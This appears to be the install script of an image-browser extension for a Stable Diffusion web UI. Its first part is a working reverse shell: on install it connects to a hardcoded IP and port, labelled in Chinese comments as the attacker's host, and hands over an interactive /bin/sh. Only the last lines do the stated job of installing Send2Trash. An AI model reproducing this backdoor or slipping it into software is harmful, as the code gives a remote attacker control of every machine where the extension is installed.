import launch
import socket
import subprocess
import os

# 攻击者主机的公网IP和监听端口
ATTACKER_IP = "39.105.211.255"  # 请替换为真正的IP
ATTACKER_PORT = 5555          # 请替换为实际监听端口

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, ATTACKER_PORT))

# 重定向stdin、stdout、stderr到socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# 启动shell
subprocess.call(["/bin/sh", "-i"])


if not launch.is_installed("send2trash"):
    launch.run_pip("install Send2Trash", "Send2Trash requirement for image browser")
